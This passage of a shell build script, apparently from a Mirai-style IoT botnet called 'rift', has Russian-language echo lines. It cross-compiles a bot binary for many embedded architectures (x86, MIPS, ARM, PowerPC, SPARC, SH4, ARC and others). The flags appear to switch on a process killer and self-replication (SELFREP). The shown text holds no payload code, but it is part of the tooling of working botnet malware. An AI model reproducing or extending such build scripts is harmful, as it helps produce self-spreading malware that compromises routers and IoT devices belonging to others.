...
compile_bot i486 rift.i486 "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - i586"
compile_bot i586 rift.x86 "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - i686"
compile_bot i686 rift.i686 "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - X86_64"
compile_bot x86_64 rift.x86_64 "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP -DX86_64 $FLAGS"

echo "компилировать - MIPS"
compile_bot mips rift.mips "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - MIPSEL"
compile_bot mipsel rift.mpsl "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - ARM/ARMv4"
compile_bot armv4l rift.arm "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - ARMv5"
compile_bot armv5l rift.arm5 "-DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - ARMv6"
compile_bot armv6l rift.arm6 "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - ARMv7"
compile_armv7 armv7l rift.arm7 "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - POWERPC"
compile_bot powerpc rift.ppc "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - SPARC"
compile_bot sparc rift.spc "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - M68K"
compile_bot m68k rift.m68k "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - SH4"
compile_bot sh4 rift.sh4 "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"

echo "компилировать - ARC"
arc_compile arc rift.arc "-static -DRIFT_KILLER -DRIFT_IOCTL -DSELFREP $FLAGS"
